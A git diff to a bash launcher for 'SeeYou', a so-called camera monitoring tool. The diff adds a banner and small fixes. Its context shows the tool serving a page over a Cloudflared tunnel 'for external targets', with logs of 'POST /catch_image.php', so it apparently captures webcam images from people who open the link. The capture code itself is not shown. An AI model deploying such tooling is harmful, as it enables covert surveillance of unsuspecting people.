@@ -7,20 +7,41 @@ YELLOW='\033[0;33m'
 CYAN='\033[0;36m'
 NC='\033[0m' # No Color
 
-# --- Function to display a clean header ---
+# --- Function to display the big welcome screen ---
+welcome_screen() {
+    clear
+    echo -e "${RED}======================================================${NC}"
+    echo -e "${CYAN}                                                      ${NC}"
+    echo -e "${CYAN}    ███████╗███████╗███████╗██╗   ██╗██╗   ██╗         ${NC}"
+    echo -e "${CYAN}    ╚══███╔╝██╔════╝██╔════╝██║   ██║██║   ██║         ${NC}"
+    echo -e "${CYAN}      ███╔╝ █████╗  █████╗  ██║   ██║██║   ██║         ${NC}"
+    echo -e "${CYAN}     ███╔╝  ██╔══╝  ██╔══╝  ██║   ██║██║   ██║         ${NC}"
+    echo -e "${CYAN}    ███████╗███████╗██║     ╚██████╔╝╚██████╔╝         ${NC}"
+    echo -e "${CYAN}    ╚══════╝╚══════╝╚═╝      ╚═════╝  ╚═════╝          ${NC}"
+    echo -e "${CYAN}                                                      ${NC}"
+    echo -e "${YELLOW}           Professional Camera Monitoring Tool          ${NC}"
+    echo -e "${RED}======================================================${NC}"
+    echo -e "${GREEN}             Developed By: Kashif           ${NC}"
+    echo -e "${RED}======================================================${NC}"
+    
+    # 4 سیکنڈ کا وقفہ (The 4-second pause)
+    sleep 4 
+}
+
+
+# --- Function to display a clean header (used after the welcome screen) ---
 tool_header() {
     clear
     echo -e "${RED}======================================================${NC}"
-    echo -e "${CYAN}    📸 SeeYou: Professional Camera Monitoring Tool ${NC}"
-    echo -e "${CYAN}    ------------------------------------------- ${NC}"
-    echo -e "${YELLOW}    Developer: Ch Kashif ${NC}"
+    echo -e "${CYAN}  📸 SeeYou: Professional Camera Monitoring Tool ${NC}"
+    echo -e "${YELLOW}    Developer: Kashif Gujjar ${NC}"
     echo -e "${RED}======================================================${NC}"
 }
 
 # --- Function to check and install dependencies (PHP & Cloudflared) ---
 check_dependencies() {
-    tool_header
-    echo-e "\n${YELLOW}[i] Checking and installing necessary dependencies...${NC}"
+    tool_header # یہاں بھی ہیڈر کو چھوٹا کر دیا ہے
+    echo -e "\n${YELLOW}[i] Checking and installing necessary dependencies...${NC}"
     
     if ! command -v php &> /dev/null; then
         echo -e "${RED}[!] PHP is not installed. Installing now...${NC}"
@@ -44,7 +65,7 @@ check_dependencies() {
 
 # --- Function to ask the user for server mode choice ---
 tool_menu() {
-    tool_header
+    tool_header # یہاں بھی ہیڈر کو چھوٹا کر دیا ہے
     echo -e "\n${CYAN}Choose your running mode:${NC}\n"
     echo -e "${GREEN}[1] Public Link (Cloudflared Tunnel - For External Targets)${NC}"
     echo -e "${YELLOW}[2] Local Host (127.0.0.1:8080 - For Testing/Local Network)${NC}"
@@ -122,10 +143,11 @@ run_local() {
     echo -e "\n${YELLOW}[i] Starting PHP Server on 127.0.0.1:8080 (Server Logs ON)...${NC}"
     echo -e "${YELLOW}[👀] Real-time monitoring started. Press Ctrl+C to stop.${NC}\n"
     
-    # FIX: Reverting to the old command to show server logs (e.g., "Accepted," "Closing," "POST /catch_image.php")
+    # Restored to original command to show server logs
     php -S 127.0.0.1:8080 router.php
 }
 
 # --- Main execution flow ---
+welcome_screen # اب سکرپٹ یہاں سے شروع ہو گا
 check_dependencies
 tool_menu
